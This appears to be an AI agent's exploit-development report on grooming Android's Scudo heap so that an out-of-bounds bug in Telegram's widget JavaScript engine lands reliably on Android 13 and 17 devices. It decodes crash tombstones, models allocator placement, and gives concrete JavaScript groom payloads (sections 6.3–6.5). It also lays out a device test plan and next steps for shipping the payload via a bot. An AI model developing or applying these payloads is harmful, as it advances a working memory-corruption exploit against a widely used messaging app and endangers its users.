# Scudo secondary placement — why the #1865 groom flips between Android 13 and 17, and what a universal groom can look like

Status: host-only analysis (no phone/emulator runs). Sources read from
`platform/external/scudo` (AOSP) at tags `android-13.0.0_r1` and
`android-17.0.0_r1`; tombstone `/tmp/opencode/tombstone_25` (Sony, 768 KB
attempt) and `/tmp/opencode/tombstone_23` (Sony, earlier attempt); device
results as reported by the sweep owner (Pixel 9 / Android 17).

**TL;DR**

* Scudo's secondary allocator does **not** randomise addresses and does **not**
  use an `mmap` hint. Every large allocation is a fresh
  `mmap(NULL, MapSize, PROT_NONE, MAP_NORESERVE)` followed by a remap of the
  commit range; the address is chosen by the kernel's top-down first-fit over
  the process's fragmented VA. The A13 → A17 geometry (headers, guard pages,
  top-of-commit placement, rounding) is **byte-for-byte identical** on arm64.
* The frame's OOB slot is always `frame_commit_end + 0x7FF80`. The chunk above
  the frame starts `0x2000` later (two merged guard pages), so the slot is
  always at **offset `0x7DF80` inside whatever chunk is directly above the
  frame**. Every observed failure is that chunk being a live engine buffer
  (the generator's bytecode), not our zero buffer.
* The frame is allocated at **`g()`**, not at the first `it.next()`
  (`js_call_generator_function` → `async_func_init` → `js_malloc`). Therefore
  `b0b` (allocated after `g()`) is *below* the frame and can never cover the
  slot; only `b0a` matters. This is also why the device never reports `S1b`.
* Whether `b0a` ends up immediately above the frame is decided by the size of
  the **topmost free gap** the kernel picks, which differs per device build.
  That is the whole Android 13 vs 17 difference: Sony's top gap is ≈1 MiB
  (768 KB fits but leaves no room; 1 MB skips it and finds a ≥2.1 MiB gap),
  Pixel's top gap is ≈1.9 MiB (768 KB leaves 1.1 MiB for the frame; 1 MB
  leaves 0.87 MiB and the frame skips to another gap).
* A deterministic universal groom is **impossible from widget JS**: there is
  no address feedback and no OS/device signal (`navigator.userAgent` is the
  fixed `Mozilla/5.0 TelegramWidget/1.0`, `platform=TelegramWidget`, and the
  Android widget API exposes no version). What *is* possible is a groom whose
  frame address is chosen through the secondary cache instead of by a fresh
  `mmap`, so the frame's placement becomes deterministic given one gap
  property, and whose failure mode is a safe `S1 NOLEAK` instead of a SIGSEGV.

---

## 1. AOSP Scudo sources actually read

Both Android 13 and Android 17 ship Scudo in `platform/external/scudo`
(`bionic/libc/Android.bp` links `//external/scudo:libscudo`; the old
`bionic/libc/scudo/` tree does not exist at either tag).

| file | 13 (`android-13.0.0_r1`) | 17 (`android-17.0.0_r1`) |
|---|---|---|
| secondary allocator | `standalone/secondary.h` (628 lines) | `standalone/secondary.h` (969 lines, rewritten) |
| platform map/unmap | `standalone/linux.cpp` | `standalone/mem_map.cpp`, `mem_map_linux.cpp` |
| config | `standalone/allocator_config.h` (`AndroidConfig`) | `config/custom_scudo_config.h` (`AndroidNormalConfig`, built with `SCUDO_USE_CUSTOM_CONFIG`) |
| build flags | `-DSCUDO_MIN_ALIGNMENT_LOG=4` | `-DSCUDO_MIN_ALIGNMENT_LOG=4` |

### 1.1 Geometry (identical on both)

`standalone/chunk.h`: `Chunk::getHeaderSize()` = `roundUp(8, 1<<4)` = **0x10**.
`secondary.h`: `LargeBlock::Header` = `Prev, Next, CommitBase, CommitSize` +
`MapBase, MapSize, MapPlatformData` (13) / `MemMapT` (17, 2 × uptr on Linux) =
**0x30**. Total header **0x40**.

```c
// secondary.h, MapAllocator::allocate() — 13 and 17, modulo spelling
RoundedSize = roundUp(Size + 0x40, PageSize);          // PageSize = 4096
MapSize     = RoundedSize + 2 * PageSize;              // one guard page each side
MapBase     = mmap(NULL, MapSize, PROT_NONE, MAP_PRIVATE|MAP_ANON|MAP_NORESERVE);
CommitBase  = MapBase + 0x1000;
CommitSize  = MapSize - 0x2000;                        // == RoundedSize
AllocPos    = CommitBase + CommitSize - Size;          // block is placed at the TOP
HeaderPos   = AllocPos - 0x10 - 0x30;
return (void *)(HeaderPos + 0x30);                     // user ptr = AllocPos - 0x10
```

The commit range is remapped `PROT_READ|PROT_WRITE` at `CommitBase`
(A17 does it through `ReservedMemory::dispatch()` + `MemMap::remap()`, which is
the same `mmap(MAP_FIXED)` sequence). The guard pages stay `PROT_NONE`; two
adjacent chunks therefore produce a merged **0x2000 `---` gap**, exactly as
seen in the tombstone (`0x7702463000-0x7702464fff ---` between the frame and
the chunk above it).

### 1.2 Address choice: kernel top-down, no Scudo randomness

* 13: `map(nullptr, MapSize, "scudo:secondary", MAP_NOACCESS|MAP_ALLOWNOMEM)`
  → `mmap(nullptr, ...)` in `linux.cpp`.
* 17: `ReservedMemoryT::create(/*Addr=*/0U, MapSize, ...)` →
  `MemMap.map(0, ...)` → `mmapWrapper(0, ...)` in `mem_map_linux.cpp`.

Neither version has a `getRandomHint()` in the secondary path. The only
randomisation in Scudo is `Primary::EnableRandomOffset` (a random page offset
inside each *primary* region) and the kernel's per-process ASLR of
`mmap_base`. Conclusion: **secondary placement is kernel first-fit, top-down,
with no per-allocation randomness.** Scudo itself is deterministic given the
process VA state.

mmap flags, both versions (only `MAP_NOACCESS`/`MAP_MEMTAG` are interpreted;
`MAP_RESIZABLE` (1<<2) and `MAP_ALLOWNOMEM` (1<<3) are Scudo-internal bits that
`linux.cpp`/`mem_map_linux.cpp` ignore):

```
reserve : MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, PROT_NONE
commit  : MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,       PROT_READ|PROT_WRITE
          (A17: same via MemMap::remap; MAP_FIXED at CommitBase)
```

`MAP_ALLOWNOMEM` turns an `ENOMEM` into a `nullptr` return instead of
`reportMapError()`, which is how a failed 2 MiB `ArrayBuffer` surfaces as a JS
allocation failure rather than an abort.

### 1.3 What actually changed 13 → 17

1. `LargeBlock::Header` stores a `MemMapT` (Base/Capacity) instead of
   `MapBase/MapSize/Data`. Same size on Linux, so the rounding boundaries and
   the top-of-commit placement are unchanged.
2. Guard pages became configurable: `SECONDARY_OPTIONAL(const bool,
   EnableGuardPages, true)`; 32-bit turns them off
   (`custom_scudo_config.h`), **arm64 keeps one page on each side**.
3. The secondary **cache was rewritten**:
   * 13: array of 256 `CachedBlock`s, `DefaultMaxEntriesCount=32`,
     `DefaultMaxEntrySize=2 MiB`, `QuarantineSize=32` (used only when MTE is
     active), MRU insert at `Entries[0]`, retrieve accepts a cached block if
     the new allocation fits within **4 pages** of the block end, and on the
     5th `store()` while full the whole cache is emptied (`empty()`).
   * 17: LRU list + free list, 256 entries, 32 used, `QuarantineSize=0`,
     `DefaultMaxEntrySize=2 MiB`, retrieve allows **8 pages** of fragmentation
     (4 unreleased + 4 released), evicts the LRU entry on overflow (no full
     flush), and releases the fragmented prefix with `MADV_DONTNEED`.
   * Both configs end up with a **0 ms release interval**, so a freed
     secondary block is `madvise(MADV_DONTNEED)`-zeroed while its VMA stays:
     13 relies on `SecondaryCacheMinReleaseToOsIntervalMs = 0` clamping the
     `INT32_MIN` flag (`SCUDO_ANDROID ? INT32_MIN : 5000`) to 0; 17 sets
     `DefaultReleaseToOsIntervalMs = 0` in `AndroidNormalConfig` explicitly.
4. 17 introduced the `ReservedMemory`/`MemMap` abstraction; the syscalls and
   VMA layout are the same.

**Nothing in (1)–(4) changes the address-selection rule.** The device
difference below is a layout difference, not a policy difference.

---

## 2. Tombstone analysis (Sony XQ-BT52, 768 KB attempt)

`/tmp/opencode/tombstone_25`, pid 27330, tid 27553 `widget.sandbox`,
`SIGSEGV` `SEGV_MAPERR` at `0x890`, pc `libtmessages.49.so+0x1714b3c`
(BuildId `645cce…`).

### 2.1 The faulting instruction

```
0x1714b34:  ldr  x19, [x8, x23, lsl #3]   ; x8 = sf->var_refs, x23 = 0xfffd
0x1714b38:  cbz  x19, ...
0x1714b3c:  ldur w8, [x19, #-4]           ; ++ref_count on the JSVarRef
```

so `x19` is the 8 bytes read from `var_refs[65533]`. Register dump:

| reg | value | meaning |
|---|---|---|
| x1 | `0x77b70a1aa8` | `JSStackFrame *sf` (the heap `JSAsyncFunctionState`) |
| x8 | `0xb400007702462f98` → `0x7702462f98` | `sf->var_refs` (`[x1+0x28]`) |
| x23 | `0xfffd` (65533) | `var_ref_idx` |
| x19 | `0x894` | value read from the OOB slot |
| x2 | `0xfffd` | same index, second copy |
| x22 | `0x7702462e78` | `var_refs - 0x120` (frame tail) |
| x28 | `0x77025a5fda` | interpreter `pc`, inside the bytecode buffer above |
| x0 | `0xb4000078c929bf48` | scudo:primary (runtime/context object) |
| x4/x25 | `0x77b33d1410`/`0x77b33d1408` | JSValue array (`0x3c,0x3d,0x3e…` ints) |

`x19 = 0x894` ⇒ `ldur w8, [0x894, #-4]` faults at `0x890`. That is a *near-null
dereference of a garbage JSVarRef*, not a guard-page hit: the slot contained
`0x894`, i.e. the low half of some live engine value.

### 2.2 Memory map (relevant window)

```
0x7702361000-0x7702361fff  ---   0x1000              leading guard of the frame
0x7702362000-0x7702462fff  rw-   0x101000  secondary  <- FRAME (1 MiB class)
0x7702463000-0x7702464fff  ---   0x2000              frame tail guard + C head guard
0x7702465000-0x77025a5fff  rw-   0x141000  secondary  <- C = generator bytecode buffer
0x77025a6000-0x77025a7fff  ---   0x2000
0x77025a8000-0x770276afff  rw-   0x1c3000  secondary  <- next engine chunk
```

* Frame: `CommitBase = 0x7702362000`, `CommitSize = 0x101000`
  (`roundUp(0x1000B0 + 0x40) = 0x101000`), `CommitEnd = 0x7702463000`.
* `var_refs = 0x7702462f98 = CommitEnd - 0x68` — i.e. at the very end of the
  frame allocation, as expected: `sf->var_refs = arg_buf + 16*local_count`
  and the frame size is `16*local_count + 8*var_ref_count`.
  Note the array itself is only `var_ref_count` entries (11–12 × 8 bytes);
  the `0x80000` is the **OOB distance** `65533*8`, not the array size.
* Slot `= var_refs + 0xfffd*8 = 0x77024e2f80`.
  `0x77024e2f80 - 0x7702463000 = 0x7ff80` and
  `0x77024e2f80 - 0x7702465000 = 0x7df80`.
* `x6 = 0x7702462f88 = var_refs - 0x10` (frame tail, the last
  `JSVarRef *` slots and padding); `x24 = 0x77b33c8538` is a context/GC
  object in the scudo:primary heap, unrelated to the frame.
* `x28 = 0x77025a5fda` is `0x26` bytes before C's commit end; the dump at that
  address is consistent with packed QuickJS bytecode, so C is the compiled
  `function* g(...)` buffer (the `"x,"`-repeated source compiles to a
  0.6–1.3 MiB bytecode object depending on the payload body).

The same arithmetic holds in `/tmp/opencode/tombstone_23` (different run):
frame `0x76ca3e6000-0x76ca4e6fff`, `var_refs = 0x76ca4e6f98`,
slot `0x76ca566f80 = frame_CommitEnd + 0x7ff80`, landing at
`0x7df80` inside the `0x94000` chunk directly above (also live engine data,
value `0xff232515ff232515`). **Two independent tombstones give exactly
`+0x7ff80`, so this is a payload/engine constant, not luck.**

### 2.3 Where is `b0a`?

`b0a` is *not* above the frame in this run; the chunk above is the bytecode
buffer. The nearest 1 MiB-class chunks in the map are a back-to-back pair at
`0x77120bd000` / `0x77121c0000`, ~253 MiB **above** the frame (most likely a
previous widget run's `b0a`/`b0b`), and the only 0xC1000 (768 KiB commit)
chunk is at `0x77123eb000`, ~256 MiB above. **No 0xC1000 chunk is adjacent to
the frame at all**, which is exactly the failure: the 768 KB ceiling went
somewhere else entirely.

Note the pair is back-to-back (`…0bd000` + `0x103000` = `…1c0000`): secondary
allocations *do* land adjacent when the gap is large enough. That is the
property the groom needs, and it is exactly what the small top gap breaks.

### 2.4 Frame timing: `g()`, not `it.next()`

`quickjs.c` (Telegram snapshot, local checkout `/tmp/opencode/qjsng_git`):

```c
static JSValue js_call_generator_function(...) {          // called by g()
    s = js_mallocz(ctx, sizeof(*s));
    s->state = JS_GENERATOR_STATE_SUSPENDED_START;
    async_func_init(ctx, &s->func_state, func_obj, this_obj, argc, argv);  // 1 MiB alloc
    func_ret = async_func_resume(ctx, &s->func_state);    // runs to OP_initial_yield
}
```

`async_func_init()` does
`sf->arg_buf = js_malloc(ctx, 16*max(arg_count,argc) + 16*var_count +
16*stack_size + 8*var_ref_count)`; with 65 534 params the app's frame is
0x1000B0 (commit 0x101000). **So the frame exists before `b0b` is allocated.**
Device evidence agrees: every successful run reports `S1a`; `S1b` has never
been observed. `b0b` is dead weight (it is below the frame, and the OOB slot
is above the frame).

---

## 3. The address model

For this payload (65 534 duplicate params, `var_ref_count` ≈ 11–12):

```
frame_CommitEnd  = F
slot             = F + 0x7FF80                 (measured, two tombstones)
next chunk base  = F + 0x2000                  (frame tail guard + next head guard)
slot in next     = next_CommitBase + 0x7DF80
```

For a ceiling buffer of size S (page-aligned), its user pointer is
`CommitBase + (CommitSize - S - 8) - 0x10`; the slot lands at
`CommitBase + 0x7DF80`, i.e. at user offset

```
off(S) = 0x7DF80 - (CommitSize - (S+8) - 0x10) = 0x7CF88 … 0x7CF98
```

The on-device marker is **`off = 511880` (`0x7CF88`)** for every successful
1 MiB run — exactly this value. Any page-aligned ceiling ≥ ~516 KiB is large
enough in principle; the size only changes `off` by 8–16 bytes.

The condition for success is therefore purely:

> **the chunk immediately above the frame must be our zero-filled ceiling,
> with commit size > 0x7DF88 (≈ 516 KiB), and it must be zero at that offset.**

Two ways to fail:

1. **Gap failure** — the frame is not placed directly below the ceiling
   (the ceiling went into a gap, or the frame skipped to another gap). Result:
   the slot lands in whatever chunk is above the frame (the bytecode buffer in
   both tombstones) → garbage `JSVarRef*` → SIGSEGV at `0x890`-style address.
2. **Cache failure** — the frame is served from the secondary cache at a
   previously freed 1 MiB block whose upper neighbour is not our ceiling →
   same crash, at an unpredictable address.

---

## 4. Why the two devices disagree

The kernel picks the **highest** gap that fits the requested `MapSize`, and
places the mapping at the **top** of that gap. Let `G` be the size of the
topmost gap that fits a ceiling of size S (`MapSize(S) = roundUp(S+0x40) +
0x2000`). The frame (map size `0x103000`) lands directly below the ceiling iff
`G - MapSize(S) ≥ 0x103000`.

| device | top gap G | 768 KB ceiling | 1 MB ceiling |
|---|---|---|---|
| Sony (A13) | ≈1.0 MiB | fits (`0xC3000`), leaves ≈0.2 MiB → **frame skips** → slot in bytecode → crash | does not fit (`0x103000 > ~0x100000`) → forced into the next, ≥2.1 MiB gap, leaves ≥1.03 MiB → **frame lands below** → 10/10 success |
| Pixel (A17) | ≈1.9 MiB | fits (`0xC3000`), leaves ≈1.1 MiB ≥ 1.03 → **frame lands below** → success | fits (`0x103000`), leaves ≈0.87 MiB < 1.03 → **frame skips** → crash |

* 1.5 MB on the Pixel needs a top gap ≥ `0x181000 + 0x103000 = 0x284000`
  (2.6 MiB); none at the top → same crash.
* 2 MB on the Pixel: `MapSize = 0x203000`, plus a 2 MiB `b0b`, the 1 MiB
  frame, the ~0.6–1.3 MiB bytecode and `buf2` — the JS runtime's ~8 MiB
  `memoryLimitBytes` (confirmed in `twidget_interrupt_re.md`: native writes
  `0x800000` at `opt+0x00`) is exceeded before the trigger. `b0b` alone is
  1 MiB of that, and it is useless (§2.4).

The A13/A17 Scudo code does not produce this difference; **the process VA
layout does**. The model is confirmed qualitatively on the host with the real
Scudo sources: in a fresh process, a 768 KiB ceiling followed by a 1 MiB
buffer is adjacent (`T - A = 0x103000`, slot inside A at `0x7cf90`), while a
2 MiB ceiling is *not* adjacent — the 1 MiB buffer is stolen into a higher
small gap (`T` above `A`), exactly the mechanism above. (Host test:
`/tmp/scudo_src/src13/groom13 u 0xc0000` vs `u` — see §7.)

---

## 5. Why a deterministic universal groom is impossible

1. **No address feedback.** Widget JS cannot read a pointer, a mapping or
   even a coarse heap statistic. The first pointer read is the leak itself,
   which is the thing we are trying to make reliable.
2. **No device signal.** `navigator.userAgent` is the constant
   `Mozilla/5.0 TelegramWidget/1.0`, `navigator.platform` is
   `TelegramWidget`; the Android widget API is a small `TelegramWidget.*`
   surface (profile constant 1, viewer/chat data, `openLink`, `copyText`,
   request/answer) with no OS version, no `Telegram.WebApp`, no `initData`
   on Android (see `widget_js_api_audit.md`). There is nothing to branch on.
3. **The kernel's first-fit depends on the whole process layout**, which is
   built by Telegram before the widget runs and differs between Android 13
   and 17 builds. The same size can be "the one that skips the small gap"
   on one build and "the one that fits the small gap" on the other.
4. **The secondary cache is global and asynchronous.** Any thread freeing a
   1 MiB-class block can change which address the frame gets. It is a
   *help* when we control it (§6), but it makes a fresh-`mmap`-based groom
   fundamentally best-effort.

So: **placement is not randomised by Scudo, but it is not controllable from
JS either.** A groom that is correct-by-construction on every Android layout
does not exist. The next section gives the strongest available construction:
deterministic *given* one gap property, with a safe, detectable failure mode
for the other cases.

---

## 6. Proposed universal groom

### 6.1 Key idea: choose the frame's address through the secondary cache

A freed secondary block of the same size class stays mapped and zeroed
(`Cache.store` → `releasePagesToOS`, `MADV_DONTNEED`) and is the **most
recent** cache entry. If we free a 1 MiB `T` immediately before `g()`, the
frame's `js_malloc(0x1000B0)` — same 0x101000 commit class — is a guaranteed
cache hit (verified against both AOSP versions, §7), and is placed at `T`'s
block, 0xB0 bytes lower because of the size difference. The frame's address
is then `T`'s address, **not** a fresh top-down `mmap`.

If `T` was allocated directly below a live zero buffer `A`, the slot lands in
`A` (§3), no matter what the device's top gap was.

### 6.2 Preventing an upward steal: make `A` not larger than `T`

The kernel places a new mapping in the highest fitting gap, so a buffer
*smaller* than `A` can be "stolen" into a gap above `A`. That is exactly what
made the `A = 2 MiB` variants fail in the host test (`T` and the frame ended
up in a higher 1 MiB gap, `T` above `A`). If `MapSize(A) ≤ MapSize(T)`, no gap
above `A` can hold `T` (every gap above `A` is smaller than `A`'s own map,
hence smaller than `T`'s), so `T` **must** go below `A` — provided `A` was
itself a fresh `mmap` (i.e. it was placed at the top of the highest gap that
fits it) and its gap has ≥ `0x103000` free below. If `A` is served from a
stale cache entry that premise is lost; that is the residual risk discussed in
§6.6 and the reason to prefer a fresh (uncacheable or clearly-not-cached) `A`
when memory allows.

The Pixel's 1 MiB failure is a different case: `A` and `T` are the same class,
so nothing can be stolen, but `A`'s 1.9 MiB gap leaves only ≈0.87 MiB below —
less than the 1.03 MiB `T`/frame needs — so `T` goes to the next gap.

With `T = 1 MiB` (`0x103000`), `A = 768 KiB` (`0xC3000`) satisfies this.
`A = 1 MiB` (`0x103000`) also satisfies it (equal sizes), and is the variant
that matches the Sony's current working point.

### 6.3 Payload

```js
/* after eval("function* g(...)") and before any generator call */
var A = new ArrayBuffer(786432);          // 768 KiB ceiling, zero-filled
var va = new Uint8Array(A); va.fill(0);
globalThis.A = A; globalThis.va = va;     // keep alive + readable

var T = new ArrayBuffer(1048576);         // 1 MiB, same class as the frame
var vt = new Uint8Array(T); vt.fill(0);   // touch it so the pages are real
T = null; vt = null;                      // both refs dropped -> js_free -> secondary cache
                                          // (release-to-OS zeroes it, mapping stays)

var it = g();                             // frame = js_malloc(0x1000B0)
                                          //  -> retrieves T's block, directly below A
var f  = it.next().value;                 // OOB read/write at A + off
```

Expected slot: `A_user + 0x7CF88 … 0x7CF90` (**511 880 … 511 888**), i.e. the
same `S1` marker value the current 1 MiB payload produces on the Sony. The
existing `scan(va)` finds the JSVarRef pointer unchanged; `buf2`/`S2` logic is
untouched.

Allocation order and sizes (exact):

| # | allocation | request | commit | map | role |
|---|---|---|---|---|---|
| 1 | `A` | 0xC0000 (786 432) | 0xC1000 | 0xC3000 | ceiling, live, zero, readable |
| 2 | `T` | 0x100000 (1 048 576) | 0x101000 | 0x103000 | sacrifice, freed into cache |
| 3 | frame (`g()`) | 0x1000B0 | 0x101000 | — (cache hit) | OOB source |

Memory: `A` 0.75 MiB + `T` 1 MiB (freed before the frame) + frame 1.05 MiB +
`buf2` 1.05 MiB + source/bytecode ≈ 1.4 MiB ≈ **4.3 MiB peak** — versus
≈5.5 MiB today with the useless `b0b`. This also removes the Pixel's 2 MiB
`Memory limit exceeded (8 MB)` failure mode.

### 6.4 Sony variant

The Sony's top gap is ≈1.0 MiB, so the 768 KiB ceiling would fit there and
leave no room. Use **`A = 1 MiB`** on a layout with that shape:

```js
var A = new ArrayBuffer(1048576); var va = new Uint8Array(A); va.fill(0); // map 0x103000
var T = new ArrayBuffer(1048576); var vt = new Uint8Array(T); vt.fill(0);
T = null; vt = null;                              // same-size sacrifice, cache it
var it = g();
```

`MapSize(A) == MapSize(T)` also forbids an upward steal (any gap above `A` is
< 0x103000). This is the candidate that should reproduce the Sony's 10/10
`S1a off=511880`, but with the frame's placement now anchored to `T` instead
of to the frame's own `mmap`.

### 6.5 Hole-carving variant (if the top gap is the problem on both)

If both devices show the wrong top-gap size for the chosen `A`, carve a hole
first:

```js
var H = new ArrayBuffer(4194304);  H = null;     // 4 MiB, commit 0x401000 > 2 MiB
                                                 //  => never cached, always a fresh mmap;
                                                 //  freed => munmap => 4 MiB hole
var A = new ArrayBuffer(1048576); var va = new Uint8Array(A); va.fill(0); // top of the hole
var T = new ArrayBuffer(1048576); var vt = new Uint8Array(T); vt.fill(0);
T = null; vt = null;
var it = g();
```

`H`'s hole is at the top of the highest gap ≥ 4 MiB; `A` and `T` then have
≥ 2 MiB of room below them, so the `A`/`T` adjacency condition is satisfied
even when the normal top gap is ≈1 MiB. Residual risk: a *higher* gap in
[`MapSize(A)`, 4 MiB) can still steal `A`; this is the unavoidable first-fit
window. It is the best available hedge when 6.3/6.4 do not fit the device.

### 6.6 Failure modes

| event | result | detectable? |
|---|---|---|
| `A`/`T` adjacent, frame hits `T` | slot in `A`, `S1a` at 511 880–888 | yes |
| frame misses `T` (cache evicted in the µs window) | frame `mmap`s below `T`'s still-mapped block → slot in `T`, which is zero and was `MADV_DONTNEED`-ed → **no crash**, `S1 NOLEAK` | yes, safe retry possible |
| `T` allocated from a stale cached block whose upper neighbour is live | slot in that neighbour → SIGSEGV | no; this is the residual risk |
| `A` allocated from a stale cached block | `T` may not be below it; same crash risk | no |

The second row is the reason the cache-based groom is strictly better than
the current one: one of the two failure paths becomes a normal `NOLEAK`
instead of a tombstone, so a second widget attempt can re-roll the layout.

---

## 7. Host verification performed (light, single-file builds)

Compiled the AOSP secondary allocator directly from the two tags (no full
AOSP build; one `g++ -j1` per variant, files: `common.cpp checksum.cpp
crc32_hw.cpp flags.cpp flags_parser.cpp linux.cpp report.cpp string_utils.cpp
release.cpp` (+ `mem_map*.cpp timing.cpp report_linux.cpp` on 17)):

```
A13  (android-13.0.0_r1, AndroidConfig):
  T = 0x7fd3fe8cd000
  U = 0x7fd3fe8cd000   reuseT = 1   delta = 0        <- freed 1 MiB block reused exactly
  F = 0x7fd3fe8ccf50   delta = -176 (0xB0)           <- frame (0x1000B0) reuses the block
  G = 0x7fd3fe8ccf50   delta = 0                      <- deterministic on repeat

A17  (android-17.0.0_r1, custom config; non-Android host branch = HostConfig):
  T = 0x7f905861b000
  U = 0x7f905861b000   reuseT = 1   delta = 0
  F = 0x7f905861af50   delta = -176
  G = 0x7f905861af50   delta = 0
```

(`HostConfig` has 1024 cache entries / 1 GiB max entry / 10 s release instead
of the device's 32 / 2 MiB / 0 ms, but the same LRU + retrieve logic and no
quarantine; the device `AndroidNormalConfig` differs only in those constants.)

(The same test against the *generic* `AndroidConfig` at the 17 tag does **not**
reuse: that config still has `QuarantineSize=32` and `QuarantineDisabled`
defaults to false, so with the 17 store path the freed block goes into the
quarantine instead of the LRU. The device build uses
`config/custom_scudo_config.h` (`AndroidNormalConfig`, `QuarantineSize=0`,
`QuarantineDisabled=true`) — this is itself a 13→17 difference worth noting,
and it is why the device-17 cache behaves like 13.)

Groom simulation (A13 source, fresh process):

```
./groom13 u 0xc0000   A=0x7fedc173f000 T=0x7fedc163c000  adj=1  F=T-0xB0  slot in A: off=0x7cf90 (511888)
./groom13 u           A=0x7ff6cf7ff000 T=0x7ffaefacd000  adj=0  F=T-0xB0  slot NOT in A
./groom13 n           A=0x7f317c7ff000 (2 MiB)            F ~16 GiB above A   slot NOT in A
```

The 768 KiB `A` is adjacent and the slot is inside it; the 2 MiB `A` is not
(the 1 MiB `T`/frame is stolen into a higher small gap). This is the same
size-threshold mechanism observed between the Sony and the Pixel, reproduced
with the real allocator code.

---

## 8. Test plan

**Sony (separate sweep, do not duplicate).** For each size S in
{512, 576, 640, 704, 768, 832, 896, 960, 1024, 1152, 1280} KiB record
`S1a/S1b/NOLEAK` and the `off` value. Prediction: a band of S values succeeds
with `off = 0x7CF88±0x10`; the lower edge of the band is the smallest S whose
`MapSize` no longer fits the ~1 MiB top gap; the upper edge is where
`MapSize(S) + 0x103000` exceeds the next gap. The sweep should show the
"staircase" predicted by §4 (success for a contiguous interval, not a single
lucky size).

**Pixel (via bot), five variants, one widget each:**

1. current payload, `b0a=768K, b0b=768K` — baseline (known good);
2. current payload with **`b0b` removed**, `b0a=768K` — checks that `b0b` is
   dead weight and saves 1 MiB (should still be `S1a`);
3. §6.3 `A=768K + T=1M freed` — expected `S1a off≈511880`;
4. §6.4 `A=1M + T=1M freed` — expected either `S1a` (if the Pixel gap is
   large enough) or `S1 NOLEAK`/crash;
5. §6.5 hole-carve `H=4M; A=1M + T=1M` — the fallback candidate.

Run each 3× cold-start (force-stop between runs) to expose cache-state
dependence; a variant that flips between `S1a` and `S1 NOLEAK` is cache-
sensitive, one that crashes is gap-sensitive.

**Acceptance criteria for "universal":**

* Sony: §6.4 or §6.5 gives `S1a off=511880` in ≥ 9/10 cold runs.
* Pixel: the same payload gives `S1a off=511880` in ≥ 9/10 cold runs.
* No variant produces a tombstone at `pc 0x1714b3c` with `fault 0x890`
  (that signature means the slot landed in the bytecode buffer, i.e. gap
  failure).

**Host checks already done** (repeatable, no device):
`/tmp/scudo_src/{src13,src17}` contain the extracted sources and
`groom_test.cpp`; `./groom13 u 0xc0000` / `./groom17c` reproduce the cache
reuse and the adjacency result in §7.

---

## 9. What to put in the payload (concrete next step)

1. Delete `b0b` (1 MiB saved; provably below the frame).
2. Replace the two 1 MiB buffers with `A` + `T` as in §6.3/§6.4.
3. Keep `scan(va)` only (drop `scan(vb)` unless `T` is kept live, which it is
   not).
4. Keep the `S1 NOLEAK` path: with the cache-based groom it is a *safe*
   outcome, and it is the signal that `T` was not below `A` (or the frame
   missed `T`) — the widget can be re-sent without a crash.
5. If the Sony sweep confirms the 1 MiB top-gap threshold, ship `A=1M` for
   the Sony-like layout and `A=768K` for the Pixel-like layout; there is no
   runtime signal to choose between them, so the *bot* must pick per device
   unless §6.5 proves stable on both.

---

## 10. Files and commands

* Sources: `/tmp/scudo_src/src13` (`android-13.0.0_r1`),
  `/tmp/scudo_src/src17` (`android-17.0.0_r1`), fetched with
  `curl 'https://android.googlesource.com/platform/external/scudo/+archive/refs/tags/<tag>/standalone.tar.gz'`;
  config from `.../config/custom_scudo_config.h?format=TEXT`.
* Tombstones: `/tmp/opencode/tombstone_25`, `/tmp/opencode/tombstone_23`.
* Engine: `/tmp/opencode/qjsng_git/quickjs.c`
  (`js_call_generator_function`, `async_func_init`, `close_var_ref`).
* Host harness: `/tmp/scudo_src/groom_test.cpp` + `src13/groom13`,
  `src17/t17c`; compiled with `-DSCUDO_LINUX=1 -DSCUDO_MIN_ALIGNMENT_LOG=4`
  (and `-DSCUDO_USE_CUSTOM_CONFIG` for the 17 device config), single-file,
  `-O1`, no full AOSP build.
* Reproduce the device fault decode:
  `llvm-objdump -d --start-address=0x1714b20 --stop-address=0x1714b60
  /tmp/opencode/libtmessages_72799.so`.

### Bottom line

The placement is **not randomised by Scudo** (no hint, no `getRandomHint` in
the secondary path; both versions use `mmap(NULL)`), but it is **not
controllable from widget JS** either. A13 and A17 use the same geometry; the
device results differ because the top-of-heap gap is ≈1.0 MiB on the Sony and
≈1.9 MiB on the Pixel, so 768 KiB and 1 MiB cross the `MapSize(S) + 0x103000`
threshold in opposite directions. A provably universal groom is impossible
without address feedback. The cache-anchored groom (§6.3/§6.4) is the
strongest available: it makes the frame's address deterministic given one
gap property, removes the useless `b0b` (fixing the Pixel 8 MiB failure), and
turns one of the two failure modes into a safe `S1 NOLEAK` that can be
retried.

### 2026-11-02 device update: the leak probe is not safe

A leak-only variant of #1865 (`lab/qjs_postsnapshot/widget_poc_1865_leak3.html`:
65,534 generator params, 1 MiB `b0`, no OOB write, prints `off`, `V`, `pv`,
`sf`) was rendered on the Sony through a local DB patch. It **crashes** the
widget sandbox (`SIGSEGV`, fault `0x77982f118a`) before the result is visible.
So the available #1865 leak is **not** a safe runtime address-feedback probe;
it cannot choose the groom A adaptively. The per-layout A/T (Sony 1 MiB /
Pixel 768 KiB) remains the only reliable universal strategy, and the Pixel
A/T/C2 loaders are still a user bot-upload step.

A sandbox fingerprint probe (Sony, `evidence/evidence_20261101/universal_fingerprint_sony.png`)
reports: `navigator.userAgent`/`platform` fixed, `hardwareConcurrency=1`,
`deviceMemory=1`, `maxTouchPoints=0`, `devicePixelRatio=2.625`,
`screen`/`inner` = 389.714×300 CSS, no Android/sdk fields, no WebGL/Audio/
Intl. The dpr is the only device-dependent value and matches the Pixel 9
density bucket (2.625); it does not expose the top-of-heap gap. A runtime A
selection remains impossible; the A/T per-layout pair is the deliverable.
